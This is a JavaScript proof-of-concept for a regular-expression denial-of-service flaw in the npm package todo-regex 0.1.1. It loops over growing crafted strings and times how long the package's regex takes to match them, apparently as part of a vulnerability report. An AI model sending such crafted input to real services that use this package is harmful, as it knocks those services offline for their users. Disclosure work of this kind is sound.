/**
 * todo-regex@0.1.1
 * Package Manager: npm
 * Link to published package: https://github.com/regexhq/todo-regex
 * Link to GitHub repo: https://github.com/regexhq/todo-regex
 * Severity level: High
 * Module Description: Regular expression for matching TODO statements in a string.
 * Additional Info: It allows cause a denial of service when matching crafted invalid TODO statements.
 * Contacted maintainer?: No
 * Open issue?: No
 */

var re = require('todo-regex');


for(var i = 1; i <= 500000; i++) {
    var time = Date.now();
    const attack_str = '<!--todo '+' '.repeat(i*10000)+'!';
    attack_str.match(re());
    var time_cost = Date.now() - time;
    console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms");
}


